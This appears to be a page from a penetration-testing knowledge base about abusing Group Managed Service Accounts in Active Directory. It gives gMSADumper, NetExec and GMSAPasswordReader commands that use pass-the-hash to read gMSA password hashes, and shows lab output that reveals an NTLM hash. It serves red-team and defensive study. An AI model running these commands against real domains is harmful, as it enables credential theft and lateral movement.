---
title: Group Managed Service Account
description: Read the NT password hash of Group Managed Service Accounts (gMSA)
categories: [Active Directory, Privilege Escalation]
tags: [Active Direcotory, Privilege Escalation, Lateral Movement, ACL Abuse, Group Managed Service Account]
weight: 2
---

The need to protect service accounts against attacks such as Kerberoasting gave rise to **Managed Service Accounts (MSA)** and later **Group Managed Service Accounts (gMSA)**. While both supports automatic password generation and rotation, the latter allows the same service accounts to be used acrossed different machines.

Members of the group that manage the gMSA are intended to be the machine accounts of the computers where the service account will be deployed on. Members have the ability to read the password hash of the service account (`ReadGMSAPassword`).


In the demo below, the Machine Account `MSN-04-SAZABI$` is part of the `WEBSERVERS` group, which manages the gMSA named `GMSAWEBAPP$`. The `WEBSERVERS` group has `ReadGMSAPassword` access over the gMSA.

![](/img/gmsa/gmsa_bh.png)

If an attacker gains admin access on one of the machines whose machine account is part of the management group, the attacker can dump the machine account hash, then use Pass-the-Hash to authenticate and read the password of the gMSA, expanding their access to all services running under the service account.

## Linux Perspective
From a Linux attacker machine, [gMSADumper](https://github.com/micahvandeusen/gMSADumper) may be used to dump
```bash
gMSADumper.py -u <machine_account> -p :<machine_account_nt_hash> -d <domain>
```

Altneratively, we may use **Netexec** with `--gmsa` option over LDAP to read the password of the gMSA.
```bash
nxc ldap <dc_ip> -u <machine_account> -H <machine_account_nt_hash> --gmsa
```
```shell-session
╭─brian@rx-93-nu /tmp/tmp.1hRpZm4tin
╰─$ nxc ldap 10.10.0.3 -u 'MSN-04-SAZABI$' -H 7e7468ada27ecd41c2650c4c06aa9163 --gmsa
LDAP        10.10.0.3       389    RA-CAILUM        [*] Windows 11 / Server 2025 Build 26100 (name:RA-CAILUM) (domain:GUNDAM.local) (signing:Enforced) (channel binding:When Supported)
LDAP        10.10.0.3       389    RA-CAILUM        [+] GUNDAM.local\MSN-04-SAZABI$:7e7468ada27ecd41c2650c4c06aa9163
LDAP        10.10.0.3       389    RA-CAILUM        [*] Getting GMSA Passwords
LDAP        10.10.0.3       389    RA-CAILUM        Account: gmsaWebApp$          NTLM: 971c7366c83e670d8a9fc44b55836aa2     PrincipalsAllowedToReadPassword: WebServers
```

## Windows Perspective
From a Winodows machine, [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) may be used to achieve the same.
```cmd
.\gmsapasswordreader.exe --accountname <gmsa_account>
```
